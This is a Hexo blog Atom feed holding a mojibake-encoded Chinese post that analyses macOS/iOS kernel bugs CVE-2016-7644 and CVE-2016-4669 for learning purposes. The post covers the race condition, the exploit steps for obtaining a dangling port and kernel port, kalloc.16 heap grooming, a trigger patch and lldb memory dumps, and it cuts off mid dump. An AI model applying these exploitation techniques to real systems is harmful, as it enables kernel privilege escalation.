<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[mrhçš„å­¦ä¹ åˆ†äº«]]></title>
  <subtitle><![CDATA[èƒ¸å£å†™ä¸€ä¸ªå‹‡å­—]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="http://turingh.github.io/"/>
  <updated>2017-01-30T23:46:33.000Z</updated>
  <id>http://turingh.github.io/</id>
  
  <author>
    <name><![CDATA[mrh]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[ä»CVE-2016-7644å›åˆ°CVE-2016-4669]]></title>
    <link href="http://turingh.github.io/2017/01/15/CVE-2016-7644-%E4%B8%89%E8%B0%88Mach-IPC/"/>
    <id>http://turingh.github.io/2017/01/15/CVE-2016-7644-ä¸‰è°ˆMach-IPC/</id>
    <published>2017-01-15T21:46:06.000Z</published>
    <updated>2017-01-30T23:46:33.000Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>å¤äººå­¦é—®æ— é—åŠ›ï¼Œå°‘å£®åŠŸå¤«è€å§‹æˆã€‚çº¸ä¸Šå¾—æ¥ç»ˆè§‰æµ…ï¼Œç»çŸ¥æ­¤äº‹è¦èº¬è¡Œã€‚</p>
<p>â€”é™†æ¸¸ã€Šå†¬å¤œè¯»ä¹¦ç¤ºå­è¿ã€‹</p>
</blockquote>
<h1 id="0x00_æ‘˜è¦">0x00 æ‘˜è¦</h1><p>æœ¬æ–‡æ˜¯ç¬¬ä¸‰ç¯‡åŸºäºæ¼æ´åˆ†ææ¥å­¦ä¹ <code>Mach IPC</code>çš„æ–¹é¢çŸ¥è¯†çš„è®°å½•ã€‚</p>
<p>é˜…è¯»é¡ºåºå¦‚ä¸‹ã€‚</p>
<p>1.<a href="http://turingh.github.io/2016/07/05/%E5%86%8D%E7%9C%8BCVE-2016-1757%E6%B5%85%E6%9E%90mach%20message%E7%9A%84%E4%BD%BF%E7%94%A8/">å†çœ‹CVE-2016-1757â€”æµ…æmach messageçš„ä½¿ç”¨</a></p>
<p>2.<a href="http://turingh.github.io/2017/01/10/CVE-2016-7637-%E5%86%8D%E8%B0%88Mach-IPC/">CVE-2016-7637â€”å†è°ˆMach IPC</a></p>
<p>3.ä»CVE-2016-7644å›åˆ°CVE-2016-4669ï¼ˆæœ¬æ–‡ï¼‰</p>
<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7644" target="_blank" rel="external">CVE-2016-7644</a>è¿™ä¸ªæ¼æ´ï¼Œæœ¬èº«æ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„æ¼æ´ï¼Œä½†æ˜¯é€šè¿‡ä¸€äº›æŠ€å·§ï¼Œå¯ä»¥åšä¸€äº›æ›´æœ‰æ„æ€çš„äº‹æƒ…ã€‚</p>
<p><code>poc</code>ä¸<code>writeup</code>åœ¨<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=965&amp;can=1&amp;q=label%3AFinder-ianbeer&amp;sort=-id" target="_blank" rel="external">è¿™é‡Œ</a>ã€‚</p>
<p>CVE-2016-4669çš„POCï¼Œä¹‹å‰æˆ‘å·²ç»åˆ†æè¿‡äº†,è¯¦è§<a href="http://turingh.github.io/2016/11/07/CVE-2016-4669%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95/">CVE-2016-4669åˆ†æä¸è°ƒè¯•</a>ã€‚åœ¨åšå®Œè¿™ä¸€ç³»åˆ—çš„<code>IPC</code>ç›¸å…³çš„æ¼æ´ç ”ç©¶ä¸å­¦ä¹ ä¹‹åï¼Œå°è¯•çš„å¯¹CVE-2016-4669è¿™ä¸ªæ¼æ´å®ç°ä¸€ä¸ªææƒçš„åˆ©ç”¨ã€‚</p>
<p>å¹¶ä¸èƒ½ç¨³å®šè§¦å‘ï¼Œä¸è¿‡ä¹ŸåŠ æ·±äº†å¯¹å†…æ ¸çš„å†…å­˜å¸ƒå±€ä¸IPCæ¨¡å—çš„ç†è§£ã€‚ä»£ç åœ¨<a href="https://github.com/turingH/CVE-2016-4669" target="_blank" rel="external">è¿™é‡Œ</a>ã€‚</p>
<a id="more"></a>
<h1 id="0x01_CVE-2016-7644_POCåˆ†æ">0x01  CVE-2016-7644 POCåˆ†æ</h1><p>æ¼æ´çš„æˆå› å¹¶ä¸å¤æ‚ï¼Œå½“ä¸¤ä¸ªçº¿ç¨‹åŒæ—¶è°ƒç”¨æ—¶ï¼Œ<code>ipc_port_release_send</code>å‡½æ•°å¯èƒ½ä¼šè¢«è°ƒç”¨ä¸¤æ¬¡ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kern_return_t</span></span><br><span class="line">  set_dp_control_port(</span><br><span class="line">    <span class="keyword">host_priv_t</span> host_priv,</span><br><span class="line">    <span class="keyword">ipc_port_t</span>  control_port) </span><br><span class="line">  &#123;</span><br><span class="line">          <span class="keyword">if</span> (host_priv == HOST_PRIV_NULL)</span><br><span class="line">                  <span class="keyword">return</span> (KERN_INVALID_HOST);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (IP_VALID(dynamic_pager_control_port))</span><br><span class="line">      ipc_port_release_send(dynamic_pager_control_port); &lt;--ç«äº‰å‘ç”Ÿçš„åœ°æ–¹</span><br><span class="line"></span><br><span class="line">    dynamic_pager_control_port = control_port;</span><br><span class="line">    <span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨<code>ipc_port_release_send</code>å‡½æ•°å†…ä¼šä¿®æ”¹<code>port</code>çš„ä¸€äº›å±æ€§ï¼Œå› ä¸ºä¸¤ä¸ªçº¿ç¨‹åŒæ—¶è°ƒç”¨ï¼Œè§¦å‘äº†å¹¶å‘çš„æ¼æ´ï¼Œå¯¼è‡´äº†<code>bug</code>çš„å‘ç”Ÿã€‚</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span><br><span class="line"><span class="title">ipc_port_release_send</span><span class="params">(</span><br><span class="line">	ipc_port_t	port)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">ipc_port_t</span> nsrequest = IP_NULL;</span><br><span class="line">	<span class="keyword">mach_port_mscount_t</span> mscount;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!IP_VALID(port))</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	ip_lock(port);</span><br><span class="line"></span><br><span class="line">	assert(port-&gt;ip_srights &gt; <span class="number">0</span>);		&lt;--çº¿ç¨‹[<span class="number">2</span>] ip_srights == <span class="number">0</span>ï¼Œè§¦å‘assertï¼Œå¯¼è‡´å†…æ ¸å´©æºƒ</span><br><span class="line">	port-&gt;ip_srights--;				</span><br><span class="line"></span><br><span class="line">	[...]</span><br><span class="line">  </span><br><span class="line">     ip_unlock(port);					&lt;--çº¿ç¨‹[<span class="number">1</span>] ip_srightså·²ç»å˜ä¸º<span class="number">0</span>ï¼Œä¸”porté”å·²ç»é‡Šæ”¾</span><br><span class="line">       </span><br><span class="line">     [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>POC</code>ä»£ç ç¼–è¯‘æˆåŠŸä¹‹åï¼Œåˆ©ç”¨shellå¾ªç¯æ‰§è¡Œå°±å¯ä»¥è§¦å‘å†…æ ¸å´©æºƒï¼Œå› ä¸ºæ˜¯å¹¶å‘çš„æ¼æ´ï¼Œæ‰€ä»¥éœ€è¦å°è¯•çš„æ¬¡æ•°æ¯”è¾ƒå¤šï¼Œæ‰‹åŠ¨æ‰§è¡Œå¯èƒ½å¾ˆéš¾è§¦å‘ã€‚</p>
<h1 id="0x02_mach_portal_redist_ç›¸å…³åˆ©ç”¨ä»£ç åˆ†æ">0x02 <strong>mach_portal_redist ç›¸å…³åˆ©ç”¨ä»£ç åˆ†æ</strong></h1><p>é€šè¿‡é˜…è¯»<code>mach_portal_redist</code>é¡¹ç›®çš„<code>kernel_sploit.c</code>æ–‡ä»¶ï¼Œæ¼æ´çš„åˆ©ç”¨æ€»å…±åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªéƒ¨åˆ†ã€‚</p>
<ul>
<li>è·å–å†…æ ¸ä¸­æŒ‡å‘<code>port</code>çš„é‡æŒ‡é’ˆ</li>
<li>å †å†…å­˜çš„å¸ƒå±€</li>
<li>é€šè¿‡<code>UAF</code>è·å–<code>kernel port</code></li>
</ul>
<p>æƒ³è¦å®Œå…¨ç†è§£è¿™å‡ ä¸ªéƒ¨åˆ†ï¼Œå°±éœ€è¦äº†è§£æ›´å¤šçš„<code>IPC</code>ç›¸å…³çš„çŸ¥è¯†ã€‚</p>
<h2 id="2-1_åˆ©ç”¨æµç¨‹">2.1 åˆ©ç”¨æµç¨‹</h2><p>é€šè¿‡æ¼æ´è·å–ä¸€ä¸ªæŒ‡å‘<code>port</code>çš„é‡æŒ‡é’ˆï¼Œæµç¨‹å¤§è‡´å¦‚ä¸‹ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç”³è¯·port</span></span><br><span class="line">mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;p);</span><br><span class="line"><span class="comment">//åœ¨ipcç³»ç»Ÿä¸­éšè—ä¸€ä¸ªportçš„reference</span></span><br><span class="line">stash_port (p) ;</span><br><span class="line"><span class="comment">//dynamic_pager_control_portè·å–ä¸€ä¸ªportçš„reference</span></span><br><span class="line">set_dp_control_port(host_priv, p) ;</span><br><span class="line"><span class="comment">// [1] å‡†å¤‡é˜¶æ®µç»“æŸ</span></span><br><span class="line"><span class="comment">//é‡Šæ”¾taskå¯¹portçš„send right</span></span><br><span class="line">mach_port_deallocate (p);</span><br><span class="line"><span class="comment">//è§¦å‘æ¼æ´</span></span><br><span class="line">race();</span><br><span class="line"><span class="comment">//é‡Šæ”¾stash_port</span></span><br><span class="line">free_stashed_ports();</span><br><span class="line"><span class="comment">// [2] è·å–portçš„é‡æŒ‡é’ˆ</span></span><br></pre></td></tr></table></figure>
<h2 id="2-2_stash_port">2.2 stash_port</h2><p>å½“ä»£ç æ‰§è¡Œåˆ°[1]å¤„æ—¶ï¼Œåšå¥½äº†æ‰€æœ‰è§¦å‘æ¼æ´å‰çš„å‡†å¤‡ã€‚æˆ‘ä»¬çš„<code>port</code>æ‹¥æœ‰3å¯¹<code>right</code>å’Œ<code>reference</code>ã€‚</p>
<p>é€šè¿‡<code>mach_port_allocate</code>å‡½æ•°çš„æ‰§è¡Œï¼Œ<code>task</code>æ‹¥æœ‰portçš„ä¸€ä»½<code>right</code>å’Œ<code>reference</code>ã€‚</p>
<p>é€šè¿‡<code>set_dp_control_port</code>å‡½æ•°çš„æ‰§è¡Œï¼Œ<code>dynamic_pager_control_port</code>æ‹¥æœ‰portçš„ä¸€ä»½<code>right</code>å’Œ<code>reference</code>ã€‚</p>
<p>è¿™ä¸¤ä¸ªéƒ¨åˆ†æ¯”è¾ƒå®¹æ˜“ç†è§£ï¼Œ<code>stash_port</code>çš„åŸç†è¾ƒä¸ºå¤æ‚ï¼Œåˆ©ç”¨äº†<code>IPC</code>ç³»ç»Ÿé€šè¿‡<code>mach message</code>ä¼ é€’æ¶ˆæ¯æ—¶çš„ç‰¹æ€§ã€‚</p>
<p>åœ¨é€šè¿‡<code>message</code>ä¼ é€’ä¸€ä¸ª<code>port right</code>æ—¶çš„æµç¨‹å¤§è‡´å¦‚ä¸‹ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line">ipc_kmsg_copyin_body</span><br><span class="line">         |</span><br><span class="line">         |----&gt; ipc_kmsg_copyin_ool_ports_descriptor</span><br><span class="line">                                 |</span><br><span class="line">                                 |-----&gt; ipc_object_copyin</span><br><span class="line">                                               |</span><br><span class="line">                                               |----&gt; ipc_right_copyin</span><br><span class="line">*/</span></span><br><span class="line"><span class="keyword">kern_return_t</span></span><br><span class="line">ipc_right_copyin(</span><br><span class="line">&#123;</span><br><span class="line">        [...]</span><br><span class="line"><span class="keyword">case</span> MACH_MSG_TYPE_MAKE_SEND: &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ((bits &amp; MACH_PORT_TYPE_RECEIVE) == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">goto</span> invalid_right;</span><br><span class="line"></span><br><span class="line">		port = (<span class="keyword">ipc_port_t</span>) entry-&gt;ie_object;</span><br><span class="line">		assert(port != IP_NULL);</span><br><span class="line"></span><br><span class="line">		ip_lock(port);</span><br><span class="line">		assert(ip_active(port));</span><br><span class="line">		assert(port-&gt;ip_receiver_name == name);</span><br><span class="line">		assert(port-&gt;ip_receiver == space);</span><br><span class="line"></span><br><span class="line">		port-&gt;ip_mscount++;</span><br><span class="line">		port-&gt;ip_srights++; <span class="comment">//é€šè¿‡å‘é€æ•°æ®ï¼Œä½†æ˜¯ä¸ä»portä¸­è¯»å–å‡ºæ¥ï¼Œä½¿å¾—rightå’Œreferenceéƒ½åŠ 1</span></span><br><span class="line">		ip_reference(port);</span><br><span class="line">		ip_unlock(port);</span><br><span class="line"></span><br><span class="line">		*objectp = (<span class="keyword">ipc_object_t</span>) port;</span><br><span class="line">		*sorightp = IP_NULL;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">         [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å½“ä»£ç é€šè¿‡<code>IPC</code>ç³»ç»Ÿå‘é€ä¸€ä¸ª<code>port right</code>æ—¶ï¼Œ<code>port</code>çš„<code>right</code>å’Œ<code>reference</code>éƒ½ä¼šåŠ 1ï¼Œè€Œåœ¨è¯»å–æ¶ˆæ¯æ—¶ï¼Œä¼šæŠŠ<code>right</code>å’Œ<code>reference</code>å‡1ï¼Œæ‰€ä»¥åœ¨æœªè°ƒç”¨<code>free_stashed_ports</code>è¯»å–å‡º<code>message</code>ä¹‹å‰ï¼Œå°±åœ¨<code>IPC</code>ç³»ç»Ÿä¸­å­˜æ”¾äº†ä¸€ä»½<code>port</code>çš„å¼•ç”¨ã€‚</p>
<h2 id="2-3_mach_port_deallocate">2.3 mach_port_deallocate</h2><p>è°ƒç”¨<code>mach_port_deallocate</code>å‡½æ•°å¯ä»¥é‡Šæ”¾ç›®æ ‡<code>port</code>çš„ä¸€ä¸ª<code>RIGHT</code>ã€‚æˆ‘ä»¬çš„<code>port</code>çš„<code>reference</code>ä¸º3ï¼Œ<code>sright</code>æ˜¯2ã€‚</p>
<h2 id="2-4_race">2.4  race</h2><p><code>race</code>å°±æ˜¯åˆ©ç”¨äº†<code>set_dp_control_port</code>å‡½æ•°çš„æ¼æ´ï¼Œåœ¨å¹¶å‘æ‰§è¡Œçš„æ—¶ï¼Œä¼šå¯¼è‡´å¯¹<code>dynamic_pager_control_port</code>è¿ç»­ä¸¤æ¬¡è°ƒç”¨<code>ipc_port_release_send</code>å‡½æ•°ã€‚</p>
<p><code>ipc_port_release_send</code>æ¯æ‰§è¡Œä¸€æ¬¡ï¼Œä¼šå¯¹ç›®æ ‡<code>port</code>çš„<code>sright</code>å’Œ<code>reference</code>åšå‡ºä¸€æ¬¡å‡ä¸€çš„æ“ä½œã€‚è¿™ä¸ªæ—¶å€™æˆ‘ä»¬çš„<code>port</code>çš„<code>reference</code>å˜æˆäº†1ï¼Œè€Œ<code>sright</code>å˜æˆäº†0ï¼Œå› ä¸ºæ²¡æœ‰<code>sendright</code> å­˜åœ¨äº†ï¼Œæ‰€ä»¥ä¼šäº§ç”Ÿä¸€ä¸ª<code>notify</code>ï¼Œé€šè¿‡è¿™ä¸ªç‰¹æ€§ï¼Œæˆ‘ä»¬å°±å¯ä»¥çŸ¥é“æˆ‘ä»¬æˆåŠŸçš„å‡ºå‘äº†æ¡ä»¶ç«äº‰çš„æ¼æ´äº†ã€‚</p>
<h2 id="2-5_free_stashed_ports">2.5 free_stashed_ports</h2><p>åœ¨<code>stashed_ports_q</code>çš„æ¶ˆæ¯é˜Ÿåˆ—ä¸­è¿˜ä¿å­˜ç€æˆ‘ä»¬ä¼ é€’çš„<code>port</code>ï¼Œåªéœ€è¦å¯¹<code>stashed_ports_q</code>è°ƒç”¨<code>mach_port_destroy</code>ï¼Œå› ä¸ºä¼ é€’çš„<code>port</code>çš„<code>reference</code>å·²ç»æ˜¯1äº†ï¼Œåœ¨å¤„ç†è¿™ä¸ªé€»è¾‘ä¹‹åï¼Œ<code>port</code>åœ¨å†…æ ¸ä¸­å°±å·²ç»è¢«é‡Šæ”¾äº†ï¼Œè€Œæˆ‘ä»¬çš„<code>task</code>ä¸­è¿˜ä¿å­˜äº†ä¸€ä¸ª<code>dangling</code>çš„<code>port</code>ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line">mach_port_destroy</span><br><span class="line">        |</span><br><span class="line">        |---&gt;ipc_right_destroy</span><br><span class="line">                    |</span><br><span class="line">                    |---&gt;ipc_port_destroy</span><br><span class="line">                                |</span><br><span class="line">                                |---&gt;ipc_mqueue_destroy</span><br><span class="line">                                			|</span><br><span class="line">                                			|---&gt;ipc_kmsg_reap_delayed</span><br><span class="line">                                			              |</span><br><span class="line">                                			              |---&gt;ipc_kmsg_clean_body</span><br><span class="line">*/</span></span><br></pre></td></tr></table></figure>
<p>è°ƒç”¨æ ˆå¤§è‡´å¦‚ä¸Šæ‰€ç¤ºï¼Œæœ€æ ¸å¿ƒçš„é€»è¾‘åœ¨<code>ipc_kmsg_clean_body</code>å‡½æ•°é‡Œå®ç°ã€‚</p>
<h1 id="0x03_å›åˆ°CVE-2016-4669">0x03 å›åˆ°CVE-2016-4669</h1><p>å¯¹CVE-2016-4669çš„POCå’Œæ¼æ´æˆå› çš„åˆ†æåœ¨<a href="http://turingh.github.io/2016/11/07/CVE-2016-4669%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95/">è¿™é‡Œ</a>ã€‚</p>
<p>æ²¡æœ‰äº†è§£è¿‡è¿™ä¸ªæ¼æ´çš„åŒå­¦å¯ä»¥å…ˆäº†è§£ä¸€ä¸‹ã€‚</p>
<p>ç»è¿‡å¯¹<code>IPC</code>æ¨¡å—ä¸€ç³»åˆ—çš„æ¼æ´çš„åˆ†æä¸å­¦ä¹ ï¼Œæˆ‘å°è¯•ç€å¯¹ä¹‹å‰åˆ†æè¿‡çš„<code>CVE-2016-4669</code>è¿™ä¸ªæ¼æ´å†™ä¸€å†™åˆ©ç”¨ã€‚</p>
<p>æ€è·¯å¤§è‡´å¦‚ä¸‹ï¼š</p>
<ul>
<li>kalloc.16 çš„å†…å­˜å¸ƒå±€ã€‚</li>
<li>è§¦å‘æ¼æ´ï¼Œåœ¨å†…å­˜ä¸­è®¿é—®è¶Šç•Œï¼Œå¯¹å…¶ä»–<code>port</code>è°ƒç”¨<code>ipc_port_release_send</code>ã€‚åˆ›é€ <code>dangling port</code>ã€‚</li>
<li>é‡ç”¨<code>port</code>ï¼Œè·å¾—<code>root</code>æƒé™ã€‚</li>
</ul>
<h2 id="3-1_kalloc-16å†…å­˜å¸ƒå±€">3.1 kalloc.16å†…å­˜å¸ƒå±€</h2><p>åœ¨æ­£å¸¸çš„æƒ…å†µä¸‹ï¼Œkalloc.16çš„æŸä¸ª<code>Page</code>ä¸­çš„å†…å­˜å¸ƒå±€å¦‚ä¸‹å›¾æ‰€ç¤º(æ›´å¤šå…³äºå†…å­˜å¸ƒå±€çš„åªæ˜¯å¯ä»¥æŸ¥çœ‹<a href="http://turingh.github.io/2016/11/07/CVE-2016-4669%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95/">è¿™é‡Œ</a>)ï¼š</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-7644-%E4%B8%89%E8%B0%88Mach-IPC/kalloc_16_normal_page.png" alt=""></p>
<ul>
<li>[a]æ ‡è®°å‡ºçš„å°±æ˜¯<code>kalloc.16</code>è¿™ä¸ª<code>zone</code>ä¸­<code>free element</code>ã€‚</li>
<li>[b]æ˜¯å·²ç»è¢«ä½¿ç”¨çš„<code>element</code>ï¼Œä¸”16ä¸ªå­—èŠ‚éƒ½ä½¿ç”¨åˆ°äº†ã€‚</li>
<li>[c]æ˜¯å·²ç»è¢«ä½¿ç”¨çš„<code>element</code>ï¼Œä½†æ˜¯åªç”¨å‰é¢å…«ä¸ªå­—èŠ‚ï¼Œæ‰€æœ‰åé¢8ä¸ªå­—èŠ‚æ˜¯<code>0xdeadbeefdeadbeef</code>ã€‚</li>
</ul>
<p>å› ä¸ºæ¼æ´ä¼šè¶Šç•Œè®¿é—®ï¼Œå¯¹ä¸‹ä¸ª<code>element</code>ä¸­çš„åœ°å€è°ƒç”¨<code>ipc_port_release_send</code>ï¼Œæ‰€ä»¥é€šè¿‡å‘ä¸€ä¸ªå¾ˆå¤šçš„<code>stash port</code>ï¼Œå‘é€åŒä¸€ä¸ª<code>target port</code>çš„<code>right</code>ï¼Œåœ¨å‘é€å®Œæˆåå†é‡Šæ”¾å…¶ä¸­ä¸€éƒ¨åˆ†å¾—<code>stash port</code>ï¼Œåœ¨<code>kalloc.16</code>çš„<code>zone</code>ä¸­åˆ¶é€ è§¦å‘æ¼æ¼æ´çš„æ—¶å€™ä½¿ç”¨çš„<code>free element</code>ã€‚</p>
<p>åœ¨æ„é€ å®Œæˆåå¤§è‡´å¦‚ä¸‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-7644-%E4%B8%89%E8%B0%88Mach-IPC/kalloc_16_layout.png" alt=""></p>
<h2 id="3-2_è§¦å‘æ¼æ´">3.2 è§¦å‘æ¼æ´</h2><p>è¿™é‡Œè¦æŠŠ<code>patch</code>çš„å‚æ•°ä¸ªæ•°ä»1æ”¹æˆ2ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">if</span>	UseStaticTemplates</span></span><br><span class="line">	InP-&gt;init_port_set = init_port_setTemplate;</span><br><span class="line">	InP-&gt;init_port_set.address = (<span class="keyword">void</span> *)(init_port_set);</span><br><span class="line">	InP-&gt;init_port_set.count = <span class="number">2</span>;<span class="comment">//1; // was init_port_setCnt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">else</span>	<span class="comment">/* UseStaticTemplates */</span></span></span><br><span class="line">	InP-&gt;init_port_set.address = (<span class="keyword">void</span> *)(init_port_set);</span><br><span class="line">	InP-&gt;init_port_set.count = <span class="number">2</span>;<span class="comment">//1; // was init_port_setCnt;</span></span><br></pre></td></tr></table></figure>
<p>å‡ºå‘æ¼æ´åï¼Œå°±å¯ä»¥çœ‹åˆ°å†…å­˜å¸ƒå±€ã€‚</p>
<p>ç®€å•çš„è°ƒè¯•æµç¨‹å¦‚ä¸‹ï¼š</p>
<p>å…ˆæ‰¾åˆ°<code>mach_ports_register</code>å‡½æ•°ç¬¬ä¸€æ¬¡è°ƒç”¨<code>ipc_port_release_send</code>çš„åœ°æ–¹ï¼Œå¹¶ä¸‹ä¸€ä¸ªæ–­ç‚¹ã€‚</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dis -n mach_ports_register   &#10;[...]&#10;    0xffffff800b0e22aa &#60;+506&#62;: call   0xffffff800b1c1bd0        ; lck_mtx_unlock&#10;    0xffffff800b0e22af &#60;+511&#62;: lea    rax, [r15 + 0x1]&#10;    0xffffff800b0e22b3 &#60;+515&#62;: cmp    rax, 0x2&#10;    0xffffff800b0e22b7 &#60;+519&#62;: jb     0xffffff800b0e22c1        ; &#60;+529&#62; at ipc_tt.c:1096&#10;    0xffffff800b0e22b9 &#60;+521&#62;: mov    rdi, r15&#10;    0xffffff800b0e22bc &#60;+524&#62;: call   0xffffff800b0c98f0        ; ipc_port_release_send at ipc_port.c:1560&#10;    0xffffff800b0e22c1 &#60;+529&#62;: lea    rax, [r13 + 0x1]&#10;    0xffffff800b0e22c5 &#60;+533&#62;: cmp    rax, 0x2&#10;    0xffffff800b0e22c9 &#60;+537&#62;: jb     0xffffff800b0e22d3        ; &#60;+547&#62; at ipc_tt.c:1096&#10;    0xffffff800b0e22cb &#60;+539&#62;: mov    rdi, r13&#10;    0xffffff800b0e22ce &#60;+542&#62;: call   0xffffff800b0c98f0        ; ipc_port_release_send at ipc_port.c:1560&#10;    0xffffff800b0e22d3 &#60;+547&#62;: lea    rax, [rbx + 0x1]&#10;    0xffffff800b0e22d7 &#60;+551&#62;: cmp    rax, 0x2&#10;    0xffffff800b0e22db &#60;+555&#62;: jb     0xffffff800b0e22e5        ; &#60;+565&#62; at ipc_tt.c:1097&#10;    0xffffff800b0e22dd &#60;+557&#62;: mov    rdi, rbx&#10;    0xffffff800b0e22e0 &#60;+560&#62;: call   0xffffff800b0c98f0        ; ipc_port_release_send at ipc_port.c:1560&#10;&#10;[...]</span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) b *0xffffff800b0e22bc&#10;Breakpoint 1: where = kernel`mach_ports_register + 524 at ipc_tt.c:1097, address = 0xffffff800b0e22bc</span><br></pre></td></tr></table></figure>
<p>ç„¶åæ‰§è¡Œ<code>exp</code>ç¨‹åºï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ˜¯ç¬¬äºŒæ¬¡å‘½ä¸­æ–­ç‚¹æ—¶ï¼Œ<code>portsCnt=3</code>ï¼ˆç¬¬ä¸€æ¬¡å‘½ä¸­æ—¶<code>portsCnt=1</code>å¹¶ä¸æ˜¯æˆ‘ä»¬çš„ä»£ç è§¦å‘çš„ï¼Œå¯ä»¥ä¸ç®¡ï¼‰ã€‚å†…å­˜å¸ƒå±€å¦‚ä¸‹ï¼š</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) p/x memory&#10;(mach_port_array_t) $10 = 0xffffff80115cf9f0&#10;(lldb) memory read --format x --size 8 --count 50 memory-0x20&#10;[...]&#10;0xffffff80115cf9a0: 0xffffff8013dee0e0 0x0000000000000000 [target_port,NULL]&#10;0xffffff80115cf9b0: 0xffffff8013dee0e0 0x0000000000000000 [target_port,NULL]&#10;0xffffff80115cf9c0: 0xffffff8013dee0e0 0x0000000000000000 [target_port,NULL]&#10;0xffffff80115cf9d0: 0xffffff8013dee0e0 0x0000000000000000 [target_port,NULL]&#10;0xffffff80115cf9e0: 0xffffff8013dee0e0 0x0000000000000000 [target_port,NULL]&#10;0xffffff80115cf9f0: 0xffffff8015f0b680 0x0000000000000000 **[p_self,NULL]**&#10;0xffffff80115cfa00: 0xffffff8013dee0e0 0x0000000000000000 [target_port,NULL]&#10;0xffffff80115cfa10: 0xffffff8013dee0e0 0x0000000000000000 [target_port,NULL]&#10;0xffffff80115cfa20: 0x0000000000000000 